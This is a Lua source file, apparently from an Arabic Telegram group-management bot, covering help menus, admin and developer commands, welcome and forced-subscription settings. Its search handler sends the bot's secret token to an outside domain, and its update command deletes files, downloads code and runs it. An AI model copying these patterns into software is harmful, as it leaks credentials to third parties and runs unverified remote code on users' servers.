if text == "م2" and ChCheck(msg) or text == "م٢" and ChCheck(msg) or text == "اوامر2" and ChCheck(msg) or text == "اوامر٢" and ChCheck(msg) then
if not Admin(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙هذا الامر يخص الرتب الاعلى فقط\n᥀︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
else
local Help = DevJoker:get(BlAcK..'Joker:Help2')
local Text = [[
᥀︙اوامر الادمنيه ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙الاعدادت
᥀︙تاك للكل 
᥀︙انشاء رابط
᥀︙ضع وصف
᥀︙ضع رابط
᥀︙ضع صوره
᥀︙حذف الرابط
᥀︙كشف البوتات
᥀︙طرد البوتات
᥀︙تنظيف + العدد
᥀︙تنظيف التعديل
᥀︙كللهم + الكلمه
᥀︙اسم البوت + الامر
᥀︙ضع • حذف ↫ ترحيب
᥀︙ضع • حذف ↫ قوانين
᥀︙اضف • حذف ↫ صلاحيه
᥀︙الصلاحيات • حذف الصلاحيات
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙ضع سبام + العدد
᥀︙ضع تكرار + العدد
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙رفع مميز • تنزيل مميز
᥀︙المميزين • حذف المميزين
᥀︙كشف القيود • رفع القيود
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙حذف • مسح + بالرد
᥀︙منع • الغاء منع
᥀︙قائمه المنع
᥀︙حذف قائمه المنع
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تفعيل • تعطيل ↫ الرابط
᥀︙تفعيل • تعطيل ↫ الالعاب
᥀︙تفعيل • تعطيل ↫ الترحيب
᥀︙تفعيل • تعطيل ↫ التاك للكل
᥀︙تفعيل • تعطيل ↫ كشف الاعدادات
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙طرد المحذوفين
᥀︙طرد ↫ بالرد • بالمعرف • بالايدي
᥀︙كتم • الغاء كتم
᥀︙تقيد • الغاء تقيد
᥀︙حظر • الغاء حظر
᥀︙المكتومين • حذف المكتومين
᥀︙المقيدين • حذف المقيدين
᥀︙المحظورين • حذف المحظورين
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تقييد دقيقه + عدد الدقائق
᥀︙تقييد ساعه + عدد الساعات
᥀︙تقييد يوم + عدد الايام
᥀︙الغاء تقييد ↫ لالغاء التقييد بالوقت
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/BLACK_TEAM_4)
]]
Dev_Joker(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "تعيين امر م3" and SecondSudo(msg) and ChCheck(msg) or text == "تعيين امر م٣" and SecondSudo(msg) and ChCheck(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙ارسل كليشة (م3) الان " ,  1, "md")
DevJoker:set(BlAcK..'Joker:Help31'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local BlAcKTeam =  DevJoker:get(BlAcK..'Joker:Help31'..msg.sender_user_id_)
if BlAcKTeam == 'msg' then
Dev_Joker(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevJoker:del(BlAcK..'Joker:Help31'..msg.sender_user_id_)
DevJoker:set(BlAcK..'Joker:Help3', text)
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
if text == "م3" and ChCheck(msg) or text == "م٣" and ChCheck(msg) or text == "اوامر3" and ChCheck(msg) or text == "اوامر٣" and ChCheck(msg) then
if not Admin(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙هذا الامر يخص الرتب الاعلى فقط\n᥀︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
else
local Help = DevJoker:get(BlAcK..'Joker:Help3')
local Text = [[
᥀︙اوامر المدراء ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙فحص البوت
᥀︙ضع اسم + الاسم
᥀︙اضف • حذف ↫ رد
᥀︙ردود المدير
᥀︙حذف ردود المدير
᥀︙اضف • حذف ↫ رد متعدد
᥀︙حذف رد من متعدد
᥀︙الردود المتعدده
᥀︙حذف الردود المتعدده
᥀︙حذف قوائم المنع
᥀︙منع ↫ بالرد على ( ملصق • صوره • متحركه )
᥀︙حذف قائمه منع + ↫ ⤈
( الصور • المتحركات • الملصقات )
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تنزيل الكل
᥀︙رفع ادمن • تنزيل ادمن
᥀︙الادمنيه • حذف الادمنيه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تثبيت
᥀︙الغاء التثبيت
᥀︙اعاده التثبيت
᥀︙الغاء تثبيت الكل
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تغير رد + اسم الرتبه + النص ↫ ⤈
᥀︙المطور • منشئ الاساسي
᥀︙المنشئ • المدير • الادمن
᥀︙المميز • المنظف • العضو
᥀︙حذف ردود الرتب
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تغيير الايدي ↫ لتغيير الكليشه
᥀︙تعيين الايدي ↫ لتعيين الكليشه
᥀︙حذف الايدي ↫ لحذف الكليشه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تفعيل • تعطيل + الامر ↫ ⤈
᥀︙اطردني • الايدي بالصوره • الابراج
᥀︙معاني الاسماء • اوامر النسب • انطق
᥀︙الايدي • تحويل الصيغ • اوامر التحشيش
᥀︙ردود المدير • ردود المطور • التحقق
᥀︙ضافني • حساب العمر • الزخرفه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/BLACK_TEAM_4)
]]
Dev_Joker(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "تعيين امر م4" and ChCheck(msg) and SecondSudo(msg) or text == "تعيين امر م٤" and SecondSudo(msg) and ChCheck(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙ارسل كليشة (م4) الان " ,  1, "md")
DevJoker:set(BlAcK..'Joker:Help41'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local BlAcKTeam =  DevJoker:get(BlAcK..'Joker:Help41'..msg.sender_user_id_)
if BlAcKTeam == 'msg' then
Dev_Joker(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevJoker:del(BlAcK..'Joker:Help41'..msg.sender_user_id_)
DevJoker:set(BlAcK..'Joker:Help4', text)
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
if text == "م٤" and ChCheck(msg) or text == "م4" and ChCheck(msg) or text == "اوامر4" and ChCheck(msg) or text == "اوامر٤" and ChCheck(msg) then
if not Admin(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙هذا الامر يخص الرتب الاعلى فقط\n᥀︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
else
local Help = DevJoker:get(BlAcK..'Joker:Help4')
local Text = [[
᥀︙اوامر المنشئين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تنزيل الكل
᥀︙الميديا • امسح
᥀︙تعين عدد الحذف
᥀︙ترتيب الاوامر
᥀︙اضف • حذف ↫ امر
᥀︙حذف الاوامر المضافه
᥀︙الاوامر المضافه
᥀︙اضف نقاط ↫ بالرد • بالايدي
᥀︙اضف رسائل ↫ بالرد • بالايدي
᥀︙رفع منظف • تنزيل منظف
᥀︙المنظفين • حذف المنظفين
᥀︙رفع مدير • تنزيل مدير
᥀︙المدراء • حذف المدراء
᥀︙تفعيل • تعطيل + الامر ↫ ⤈
᥀︙نزلني • امسح
᥀︙الحظر • الكتم
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙اوامر المنشئين الاساسيين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙وضع لقب + اللقب
᥀︙تفعيل • تعطيل ↫ الرفع
᥀︙رفع منشئ • تنزيل منشئ
᥀︙المنشئين • حذف المنشئين
᥀︙رفع • تنزيل ↫ مشرف
᥀︙رفع بكل الصلاحيات
᥀︙حذف القوائم
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙اوامر المالكين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙رفع • تنزيل ↫ منشئ اساسي
᥀︙حذف المنشئين الاساسيين 
᥀︙المنشئين الاساسيين 
᥀︙حذف جميع الرتب
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/BLACK_TEAM_4)
]]
Dev_Joker(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "تعيين امر م5" and SecondSudo(msg) and ChCheck(msg) or text == "تعيين امر م٥" and SecondSudo(msg) and ChCheck(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙ارسل كليشة (م5) الان " ,  1, "md")
DevJoker:set(BlAcK..'Joker:Help51'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local BlAcKTeam =  DevJoker:get(BlAcK..'Joker:Help51'..msg.sender_user_id_)
if BlAcKTeam == 'msg' then
Dev_Joker(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevJoker:del(BlAcK..'Joker:Help51'..msg.sender_user_id_)
DevJoker:set(BlAcK..'Joker:Help5', text)
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
if text == "م٥" and ChCheck(msg) or text == "م5" and ChCheck(msg) or text == "اوامر5" and ChCheck(msg) or text == "اوامر٥" and ChCheck(msg) then
if not SudoBot(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙هذا الامر للمطورين فقط', 1, 'md')
else
local Help = DevJoker:get(BlAcK..'Joker:Help5')
local Text = [[
᥀︙اوامر المطورين ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙الكروبات
᥀︙المطورين
᥀︙المشتركين
᥀︙الاحصائيات
᥀︙المجموعات
᥀︙اسم البوت + غادر
᥀︙اسم البوت + تعطيل
᥀︙كشف + -ايدي المجموعه
᥀︙رفع مالك • تنزيل مالك
᥀︙المالكين • حذف المالكين
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙رفع • تنزيل ↫ مدير عام
᥀︙حذف • المدراء العامين 
᥀︙رفع • تنزيل ↫ ادمن عام
᥀︙حذف • الادمنيه العامين 
᥀︙رفع • تنزيل ↫ مميز عام
᥀︙حذف • المميزين عام 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙اوامر المطور الاساسي ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تحديث
᥀︙السيرفر
᥀︙روابط الكروبات
᥀︙تحديث السورس
᥀︙تنظيف الكروبات
᥀︙تنظيف المشتركين
᥀︙حذف جميع الملفات
᥀︙تعيين الايدي العام
᥀︙تغير المطور الاساسي
᥀︙حذف معلومات الترحيب
᥀︙تغير معلومات الترحيب
᥀︙غادر + -ايدي المجموعه
᥀︙تعيين عدد الاعضاء + العدد
᥀︙حظر عام • الغاء العام
᥀︙كتم عام • الغاء العام
᥀︙قائمه العام • حذف قائمه العام
᥀︙وضع • حذف ↫ اسم البوت
᥀︙اضف • حذف ↫ رد عام
᥀︙ردود المطور • حذف ردود المطور
᥀︙تعيين • حذف • جلب ↫ رد الخاص
᥀︙جلب نسخه الكروبات
᥀︙رفع النسخه + بالرد على الملف
᥀︙تعيين • حذف ↫ قناة الاشتراك
᥀︙جلب كليشه الاشتراك
᥀︙تغيير • حذف ↫ كليشه الاشتراك
᥀︙رفع • تنزيل ↫ مطور
᥀︙المطورين • حذف المطورين
᥀︙رفع • تنزيل ↫ مطور ثانوي
᥀︙الثانويين • حذف الثانويين
᥀︙تعيين • حذف ↫ كليشة الايدي
᥀︙اذاعه للكل بالتوجيه ↫ بالرد
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙تفعيل ملف + اسم الملف
᥀︙تعطيل ملف + اسم الملف
᥀︙تفعيل • تعطيل + الامر ↫ ⤈
᥀︙الاذاعه • الاشتراك الاجباري
᥀︙ترحيب البوت • المغادره
᥀︙البوت الخدمي • التواصل
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/BLACK_TEAM_4)
]]
Dev_Joker(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "تعيين امر م6" and SecondSudo(msg) and ChCheck(msg) or text == "تعيين امر م٦" and SecondSudo(msg) and ChCheck(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙ارسل كليشة (م6) الان " ,  1, "md")
DevJoker:set(BlAcK..'Joker:Help61'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local BlAcKTeam =  DevJoker:get(BlAcK..'Joker:Help61'..msg.sender_user_id_)
if BlAcKTeam == 'msg' then
Dev_Joker(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevJoker:del(BlAcK..'Joker:Help61'..msg.sender_user_id_)
DevJoker:set(BlAcK..'Joker:Help6', text)
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
if text == "م٦" and ChCheck(msg) or text == "م6" and ChCheck(msg) or text == "اوامر6" and ChCheck(msg) or text == "اوامر٦" and ChCheck(msg) then
local Help = DevJoker:get(BlAcK..'Joker:Help6')
local Text = [[
᥀︙اوامر الاعضاء ↫ ⤈
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙السورس • موقعي • رتبتي • معلوماتي 
᥀︙رقمي • لقبي • نبذتي • صلاحياتي • غنيلي
᥀︙رسائلي • حذف رسائلي • اسمي • معرفي 
᥀︙ايدي •ايديي • جهاتي • راسلني • الالعاب 
᥀︙نقاطي • بيع نقاطي • القوانين • زخرفه 
᥀︙رابط الحذف • نزلني • اطردني • المطور 
᥀︙منو ضافني • مشاهدات المنشور • الرابط 
᥀︙ايدي المجموعه • معلومات المجموعه 
᥀︙نسبه الحب • نسبه الكره • نسبه الغباء 
᥀︙نسبه الرجوله • نسبه الانوثه • التفاعل
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙لقبه + بالرد
᥀︙كول + الكلمه
᥀︙زخرفه + اسمك
᥀︙برج + نوع البرج
᥀︙معنى اسم + الاسم
᥀︙بوسه • بوسها ↫ بالرد
᥀︙احسب + تاريخ ميلادك
᥀︙تفاعلي • تفاعله ↫ بالرد
᥀︙صلاحياته ↫ بالرد • بالمعرف • بالايدي
᥀︙ايدي • كشف  ↫ بالرد • بالمعرف • بالايدي
᥀︙تحويل + بالرد ↫ صوره • ملصق • صوت • بصمه
᥀︙انطق + الكلام تدعم جميع اللغات مع الترجمه للعربي
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
᥀︙[Source Channel](https://t.me/BLACK_TEAM_4)
]]
Dev_Joker(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end
--     Source BlAcK     --
if text == 'تفعيل اليوتيوب' and Manager(msg) then  
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تفعيل اليوتيوب بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:del(BlAcK.."Joker:WhyTube"..msg.chat_id_) 
return false  
end
if text == 'تعطيل اليوتيوب' and Manager(msg) then  
local BlAcKTeam = '᥀︙اهلا عزيزي ↫ '..JokerRank(msg)..' \n᥀︙تم تعطيل اليوتيوب بنجاح'
Jokermoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BlAcKTeam, 14, string.len(msg.sender_user_id_))
DevJoker:set(BlAcK.."Joker:WhyTube"..msg.chat_id_,true) 
return false  
end 
if text and text:match('^بحث (.*)$') and not DevJoker:get(BlAcK.."Joker:WhyTube"..msg.chat_id_) then            
local Text = text:match('^بحث (.*)$') 
local msg_id = msg.id_/2097152/0.5 
https.request('https://ccccxcc.ml/BlAcK/Api.php?Put=Search&TokenBot='..TokenBot..'&ChatId='..msg.chat_id_..'&UserId='..msg.sender_user_id_..'&Text='..URL.escape(Text)..'&MsgId='..msg_id..'&Name='..DirName)
end
--     Source BlAcK     --
if SecondSudo(msg) then
if text == "تحديث السورس" and SourceCh(msg) or text == "تحديث سورس" and SourceCh(msg) or text == "↫ تحديث السورس ᥀" and SourceCh(msg) then 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙جاري تحديث سورس بلاك', 1, 'md') 
os.execute('rm -rf BlAcK.lua') 
os.execute('wget https://raw.githubusercontent.com/TeAmBlAcK/BlAcK/master/BlAcK.lua') 
dofile('BlAcK.lua') 
io.popen("rm -rf ../.telegram-cli/*")
print("\27[31;47m\n          ( تم تحديث السورس )          \n\27[0;34;49m\n") 
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم التحديث الى الاصدار الجديد', 1, 'md') 
end
if text == 'تحديث' and SourceCh(msg) or text == 'تحديث البوت' and SourceCh(msg) or text == '↫ تحديث ᥀' and SourceCh(msg) then  
dofile('BlAcK.lua') 
io.popen("rm -rf ../.telegram-cli/*")
print("\27[31;47m\n        ( تم تحديث ملفات البوت )        \n\27[0;34;49m\n") 
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم تحديث ملفات البوت", 1, "md")
end
--     Source BlAcK     --
if text == 'نقل الاحصائيات' and ChCheck(msg) or text == '↫ نقل الاحصائيات ᥀' and ChCheck(msg) then
local Users = DevJoker:smembers(BlAcK.."User_Bot")
local Groups = DevJoker:smembers(BlAcK..'Chek:Groups')
local Sudos = DevJoker:smembers(BlAcK.."Sudo:User")
if DevJoker:get(BlAcK..'Name:Bot') then
DevJoker:set(BlAcK..'Joker:NameBot',(DevJoker:get(BlAcK..'Name:Bot') or 'بلاك'))
end
for i = 1, #Users do
local id = Users[i]
if id:match("^(%d+)") then
DevJoker:sadd(BlAcK..'Joker:Users',Users[i]) 
end
end
for i = 1, #Sudos do
DevJoker:sadd(BlAcK..'Joker:SudoBot:',Sudos[i]) 
end
for i = 1, #Groups do
DevJoker:sadd(BlAcK..'Joker:Groups',Groups[i]) 
if DevJoker:get(BlAcK.."Private:Group:Link"..Groups[i]) then
DevJoker:set(BlAcK.."Joker:Groups:Links"..Groups[i],DevJoker:get(BlAcK.."Private:Group:Link"..Groups[i]))
end
if DevJoker:get(BlAcK.."Get:Welcome:Group"..Groups[i]) then
DevJoker:set(BlAcK..'Joker:Groups:Welcomes'..Groups[i],DevJoker:get(BlAcK.."Get:Welcome:Group"..Groups[i]))
end
local list2 = DevJoker:smembers(BlAcK..'Constructor'..Groups[i])
for k,v in pairs(list2) do
DevJoker:sadd(BlAcK.."Joker:Constructor:"..Groups[i], v)
end
local list3 = DevJoker:smembers(BlAcK..'BasicConstructor'..Groups[i])
for k,v in pairs(list3) do
DevJoker:sadd(BlAcK.."Joker:BasicConstructor:"..Groups[i], v)
end
local list4 = DevJoker:smembers(BlAcK..'Manager'..Groups[i])
for k,v in pairs(list4) do
DevJoker:sadd(BlAcK.."Joker:Managers:"..Groups[i], v)
end
local list5 = DevJoker:smembers(BlAcK..'Mod:User'..Groups[i])
for k,v in pairs(list5) do
DevJoker:sadd(BlAcK.."Joker:Admins:"..Groups[i], v)
end
local list6 = DevJoker:smembers(BlAcK..'Special:User'..Groups[i])
for k,v in pairs(list6) do
DevJoker:sadd(BlAcK.."Joker:VipMem:"..Groups[i], v)
end
DevJoker:set(BlAcK.."Joker:Lock:Bots"..Groups[i],"del") DevJoker:hset(BlAcK.."Joker:Spam:Group:User"..Groups[i] ,"Spam:User","keed") 
LockList ={'Joker:Lock:Links','Joker:Lock:Forwards','Joker:Lock:Videos','Joker:Lock:Gifs','Joker:Lock:EditMsgs','Joker:Lock:Stickers','Joker:Lock:Farsi','Joker:Lock:Spam','Joker:Lock:WebLinks'}
for i,Lock in pairs(LockList) do
DevJoker:set(BlAcK..Lock..Groups[i],true)
end
end
send(msg.chat_id_, msg.id_,'᥀︙تم نقل ↫ '..#Groups..' مجموعه\n᥀︙تم نقل ↫ '..#Users..' مشترك\n᥀︙من التحديث القديم الى التحديث الجديد')
end
end
--     Source BlAcK     --
if text and (text == 'حذف معلومات الترحيب' or text == 'مسح معلومات الترحيب') and SecondSudo(msg) and ChCheck(msg) then    
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم حذف معلومات الترحيب', 1, 'md')   
DevJoker:del(BlAcK..'Joker:Text:BotWelcome')
DevJoker:del(BlAcK..'Joker:Photo:BotWelcome')
return false
end 
if text and (text == 'تفعيل ترحيب البوت' or text == 'تفعيل معلومات الترحيب' or text == '↫ تفعيل ترحيب البوت ᥀') and SecondSudo(msg) and ChCheck(msg) then    
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم تفعيل الترحيب عند اضافة البوت في المجموعه', 1, 'md')   
DevJoker:del(BlAcK..'Joker:Lock:BotWelcome')
return false
end 
if text and (text == 'تعطيل ترحيب البوت' or text == 'تعطيل معلومات الترحيب' or text == '↫ تعطيل ترحيب البوت ᥀') and SecondSudo(msg) and ChCheck(msg) then    
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم تعطيل الترحيب عند اضافة البوت في المجموعه', 1, 'md')   
DevJoker:set(BlAcK..'Joker:Lock:BotWelcome',true)
return false
end 
if text and (text == 'تغير معلومات الترحيب' or text == 'تغيير معلومات الترحيب' or text == '↫ تغير معلومات الترحيب ᥀') and SecondSudo(msg) and ChCheck(msg) then    
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙ارسل لي نص الترحيب', 1, 'md') 
DevJoker:del(BlAcK..'Joker:Text:BotWelcome')
DevJoker:del(BlAcK..'Joker:Photo:BotWelcome')
DevJoker:set(BlAcK.."Joker:Set:BotWelcome"..msg.sender_user_id_,"Text") 
return false
end 
if text and DevJoker:get(BlAcK.."Joker:Set:BotWelcome"..msg.sender_user_id_) == 'Text' then 
if text and text:match("^الغاء$") then 
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر", 1, "md") 
DevJoker:del(BlAcK.."Joker:Set:BotWelcome"..msg.sender_user_id_)   
return false
end 
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ النص ارسل لي صورة الترحيب\n᥀︙ارسل ↫ الغاء لحفظ النص فقط", 1, 'md')   
DevJoker:set(BlAcK.."Joker:Text:BotWelcome",text) 
DevJoker:set(BlAcK.."Joker:Set:BotWelcome"..msg.sender_user_id_,"Photo") 
return false 
end 
if DevJoker:get(BlAcK.."Joker:Set:BotWelcome"..msg.sender_user_id_) == 'Photo' then 
if text and text:match("^الغاء$") then 
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ النص والغاء حفظ صورة الترحيب", 1, "md") 
DevJoker:del(BlAcK.."Joker:Set:BotWelcome"..msg.sender_user_id_)    
return false
end 
if msg.content_.photo_ and msg.content_.photo_.sizes_[1] then   
DevJoker:set(BlAcK.."Joker:Photo:BotWelcome",msg.content_.photo_.sizes_[1].photo_.persistent_id_)
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم حفظ النص وصورة الترحيب", 1, 'md')   
DevJoker:del(BlAcK.."Joker:Set:BotWelcome"..msg.sender_user_id_)   
end
return false
end
--     Source BlAcK     --
if text and text:match("^ضع كليشه المطور$") or text and text:match("^وضع كليشه المطور$") or text and text:match("^تغيير كليشه المطور$") or text and text:match("^↫ تغيير كليشه المطور ᥀$") and ChCheck(msg) then
if not Sudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙ارسل كليشة المطور الان ", 1, "md")
DevJoker:setex(BlAcK.."Joker:DevText"..msg.chat_id_..":" .. msg.sender_user_id_, 300, true)
end end
if text and text:match("^مسح كليشه المطور$") or text and text:match("^حذف كليشه المطور$") then
if not SecondSudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم حذف كليشة المطور", 1, "md")
DevJoker:del(BlAcK.."DevText")
end end
--     Source BlAcK     --
if DevJoker:get(BlAcK.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_Joker(msg.chat_id_, msg.id_, 1, "᥀︙تم الغاء الامر", 1, "md") 
DevJoker:del(BlAcK.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevJoker:del(BlAcK.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
DevJoker:set(BlAcK..'Joker:ChText',texxt)
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙تم تغيير كليشة الاشتراك الاجباري', 1, 'md')
end
if text and text:match("^↫ تغير كليشه الاشتراك ᥀$") and Sudo(msg)  or text and text:match("^تغيير كليشه الاشتراك$") and Sudo(msg) then  
DevJoker:setex(BlAcK.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)   
local text = '᥀︙حسنا ارسل كليشة الاشتراك الجديده'  
Dev_Joker(msg.chat_id_, msg.id_, 1,text, 1, 'md') 
end
if text == "حذف كليشه الاشتراك الاجباري" or text == "↫ حذف كليشه الاشتراك ᥀" then  
if not Sudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
else
DevJoker:del(BlAcK..'Joker:ChText')
textt = "᥀︙تم حذف كليشة الاشتراك الاجباري"
Dev_Joker(msg.chat_id_, msg.id_, 1,textt, 1, 'md') 
end end
if text == 'كليشه الاشتراك' or text == 'جلب كليشه الاشتراك' or text == '↫ كليشه الاشتراك ᥀' then
if not SecondSudo(msg) then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙للمطور الاساسي فقط ', 1, 'md')
else
local chtext = DevJoker:get(BlAcK.."Joker:ChText")
if chtext then
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙كليشة الاشتراك ↫ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n['..chtext..']', 1, 'md')
else
if DevJoker:get(BlAcK.."Joker:ChId") then
local Check = https.request('https://api.telegram.org/bot'..TokenBot..'/getChat?chat_id='..DevJoker:get(BlAcK.."Joker:ChId"))
local GetInfo = JSON.decode(Check)
if GetInfo.result.username then
User = "https://t.me/"..GetInfo.result.username
else
User = GetInfo.result.invite_link
end
Text = "*᥀︙عذرا لاتستطيع استخدام البوت !\n᥀︙عليك الاشتراك في القناة اولا :*"
keyboard = {} 
keyboard.inline_keyboard = {{{text=GetInfo.result.title,url=User}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
else
Dev_Joker(msg.chat_id_, msg.id_, 1, '᥀︙لم يتم تعيين قناة الاشتراك الاجباري \n᥀︙ارسل ↫ تعيين قناة الاشتراك للتعيين ', 1, 'md')
end end end end
--     Source BlAcK     --
if text == 'القناة' and SourceCh(msg) or text == 'قناة السورس' and SourceCh(msg) or text == 'قناه السورس' and SourceCh(msg) or text == 'قنات السورس' and SourceCh(msg) or text == '↫ قناة السورس ᥀' and SourceCh(msg) then 
Text = [[
᥀︙[قناة السورس](https://t.me/BLACK_TEAM_4)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '᥀ قناة السورس',url="t.me/BLACK_TEAM_4"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/BLACK_TEAM_4&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
--     Source BlAcK     --
if text == "مبرمج السورس" and SourceCh(msg) or text == "مطور السورس" and SourceCh(msg) or text == "فين المبرمج" and SourceCh(msg) or text == "المبرمج" and SourceCh(msg) or text == "↫ مبرمج السورس ᥀" and SourceCh(msg) then 
Text = [[
᥀︙[مبرمج السورس](https://t.me/UUOUOU_7)
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '᥀ مبرمج السورس',url="t.me/UUOUOU_7"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/UUOUOU_7&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
end
--     Source BlAcK     --
